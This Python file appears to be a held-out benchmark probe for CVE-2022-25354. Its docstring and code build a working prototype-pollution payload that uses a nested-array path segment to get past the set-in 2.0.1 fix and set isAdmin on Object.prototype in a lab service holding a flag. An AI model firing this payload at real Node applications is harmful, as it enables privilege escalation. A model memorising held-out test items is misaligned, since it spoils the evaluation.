#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2022-25354 residual -- nested-array (type-confusion) bypass of the 2.0.1 fix.

real-app-http: fired as REAL EXTERNAL HTTP against the running Express service:
  POST /merge  {"path": [["__proto__"],"isAdmin"], "value": true}
then GET /check observes whether Object.prototype was polluted. The service calls the REAL published
set-in setIn({}, path, value) on the attacker JSON -- no in-process probe, no source-lift.

The CVE-2020-28273 fix (present on V1 = set-in 2.0.1) guards each path segment with a strict `!==`
STRING comparison and NO type coercion:

    assert.ok(path[index] !== '__proto__', ...)

A path whose FIRST segment is itself an array -- `[["__proto__"], "isAdmin"]` -- makes the dangerous
key the ARRAY `["__proto__"]`. `["__proto__"] !== '__proto__'` is TRUE (array vs string), so the
assert PASSES it; then the native deref `object[key]` coerces the array back to the string
'__proto__' (Array.prototype.toString joins to "__proto__"), so the walk still steps onto
Object.prototype and the leaf `set()` writes `isAdmin = true` onto it = CWE-843 type confusion. A
later GET /check sees `({}).isAdmin === true` and releases the flag on V1.

This is CVE-2022-25354, which SNYK-JS-SETIN-2388571 states 'derives from an incomplete fix of
CVE-2020-28273'. Advisory PoC: setIn({}, [['__proto__'],'polluted'], 'success').

CVE-2022-25354 fix (V2 = set-in 2.0.3) adds an entry-level type-check at setIn():

    assert.ok(path.every(p => typeof p === 'number' || typeof p === 'string'), ...)

The nested-array segment is typeof 'object', so the entry assert throws BEFORE any recursion/write --
the residual is rejected (POST /merge blocked, /check stays null, no flag).

Contract: reaches the flag on V1; closed on V2.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /merge whose first path segment is a NESTED ARRAY of the dangerous name."""
    return {
        "probe_id": "cve-2022-25354-nested-array-proto",
        "method": "POST",
        "path_route": "/merge",
        "path": [["__proto__"], "isAdmin"],
        "value": True,
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
